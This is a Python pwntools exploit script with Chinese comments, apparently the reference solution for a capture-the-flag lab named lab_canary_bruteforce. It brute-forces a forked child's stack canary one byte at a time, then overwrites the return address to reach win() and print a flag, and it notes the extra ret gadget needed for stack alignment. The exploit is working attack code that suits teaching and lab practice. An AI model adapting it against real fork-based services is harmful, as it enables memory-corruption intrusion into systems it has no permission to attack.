#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""lab_canary_bruteforce —— canary 逐字节爆破参考 exploit

思路：
  * 每次 fork 的子进程 canary 相同 → 溢出长度固定，逐字节试；
  * 判据：一字节猜错 → 子进程被 __stack_chk_fail 杀掉，输出里只有
    "*** stack smashing detected ***"；猜对 → 函数正常返回，打印 "SURVIVED"；
  * 8 字节 canary 里最低字节恒为 \\x00，所以先固定 b"\\x00" 再爆后 7 字节。

用法：
    cd labs/lab_canary_bruteforce
    make
    printf '__PWNED__{canary}\\n' > flag.txt
    python exp.py
"""
import os
import sys

from pwn import *

context.arch = "amd64"
context.log_level = "info"

BIN = "./chal"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))

OFFSET = 0x48          # 填充到 canary 的长度（buf 0x40 + 8 字节对齐/局部变量）


def start():
    if HOST:
        return remote(HOST, PORT)
    return process(BIN)


def attempt(p, guess: bytes) -> bool:
    """发送 0x48 + guess，判断这一轮是否活着返回。"""
    p.send(b"A" * OFFSET + guess)
    data = p.recvuntil(b"payload: ", timeout=5)
    return b"SURVIVED" in data


def brute_canary(p) -> bytes:
    canary = b"\x00"                       # 最低字节已知
    while len(canary) < 8:
        for b in range(256):
            guess = canary + bytes([b])
            if attempt(p, guess):
                canary = guess
                log.info("canary[%d] = %#04x  (%s)", len(canary) - 1, b,
                         canary.hex())
                break
        else:
            raise SystemExit(f"[-] 第 {len(canary)} 字节爆不出来，检查 OFFSET")
    return canary


def exploit():
    e = ELF(BIN, checksec=False)
    win = e.symbols["win"]
    # 关键细节：直接 ret 到 win() 时栈是 16 字节对齐的，而 win 里第一次
    # 调 system@plt 会走 _dl_runtime_resolve，它要求 rsp % 16 == 8（call 语义）。
    # 前面垫一个 ret gadget 把 rsp 下移 8 字节即可，否则表现为“打印了
    # [+] canary bypassed 但 flag 不出来”，非常像 system 静默失败。
    ret = ROP(e).find_gadget(["ret"])[0]
    log.info("win = %#x, ret = %#x", win, ret)

    p = start()
    p.recvuntil(b"payload: ")              # 第一次 prompt

    canary = brute_canary(p)
    log.success("canary = %s", canary.hex())

    p.send(b"A" * OFFSET + canary + b"B" * 8 + p64(ret) + p64(win))
    p.recvuntil(b"here is your flag:")
    return p.recvall(timeout=5)


if __name__ == "__main__":
    out = exploit()
    sys.stdout.buffer.write(out)
    sys.stdout.write("\n" if not out.endswith(b"\n") else "")
    if b"__PWNED__" not in out:
        raise SystemExit("[-] 没拿到 flag，检查 labs/lab_canary_bruteforce/flag.txt")
    log.success("canary bruteforce OK")
